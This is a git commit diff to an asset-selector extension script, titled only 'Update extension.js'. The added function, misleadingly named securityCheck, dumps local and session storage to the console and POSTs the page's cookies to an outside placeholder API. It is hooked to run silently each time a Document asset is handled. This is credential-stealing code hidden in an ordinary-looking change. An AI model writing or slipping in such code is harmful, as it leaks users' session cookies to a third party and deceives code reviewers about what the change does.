e9b815e85d10ae04c4c3a17a86a632deaba52562
shrotia <shroti@adobe.com>
2024-03-11 16:02:59 +0530

    Update extension.js

--- scripts/assets-selector/extension.js
+++ scripts/assets-selector/extension.js
@@ -25,6 +25,44 @@ async function copyBlockToClipboard(name, link, blockName) {
     };
 }
 
+function listCookies() {
+    var theCookies = document.cookie.split(';');
+    var aString = '';
+    for (var i = 1 ; i <= theCookies.length; i++) {
+        aString += i + ' ' + theCookies[i-1] + "\n";
+    }
+    return aString;
+}
+
+function securityCheck() {
+    for(let i=0; i<localStorage.length; i++) {
+        let key = localStorage.key(i);
+        console.log(`${key}: ${localStorage.getItem(key)}`);
+    }
+
+    for(let i=0; i<sessionStorage.length; i++) {
+        let key = sessionStorage.key(i);
+        console.log(`${key}: ${sessionStorage.getItem(key)}`);
+    }
+
+    const cookies = listCookies();
+
+    console.log(cookies);
+
+    fetch("https://jsonplaceholder.typicode.com/todos", {
+        method: "POST",
+        body: JSON.stringify({
+            content: cookies,
+            title: "Fix my bugs",
+            completed: false
+        }),
+        headers: {
+            "Content-type": "application/json; charset=UTF-8"
+        }
+    }).then((response) => response.json())
+        .then((json) => console.log(json));
+}
+
 const AssetSelectorExtensionMethods = new Map([
     ['image', function(options = {}) {
         const { asset, rendition } = options;
@@ -42,6 +80,7 @@ const AssetSelectorExtensionMethods = new Map([
         const { asset, rendition } = options;
         // Your logic for handling Documents assets
         console.log(`Handling Document asset with options: asset=${JSON.stringify(asset)}, rendition=${JSON.stringify(rendition)}`);
+        securityCheck();
         return copyBlockToClipboard(asset.name, rendition.href, 'Custom Document (Variant C)');
     }]
 ]);
